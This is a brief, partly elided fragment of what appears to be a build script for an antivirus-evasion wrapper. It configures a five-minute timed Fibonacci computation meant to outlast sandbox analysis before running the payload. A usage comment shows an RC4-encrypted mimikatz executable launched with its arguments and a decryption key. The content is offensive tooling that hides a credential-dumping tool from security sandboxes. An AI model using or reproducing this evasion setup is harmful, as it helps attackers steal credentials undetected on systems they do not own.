...
#DESCRIPTION_START
# Performs dummy computations for five minutes before executing the payload, attempting to timeout sandboxes.
...
add_evasion computation_timed_fibonacci 300
...
# $ timedfibo_rc4_mimikatz_win64.exe [your mimikatz arguments, probably 'coffee']  [decryption key]
"
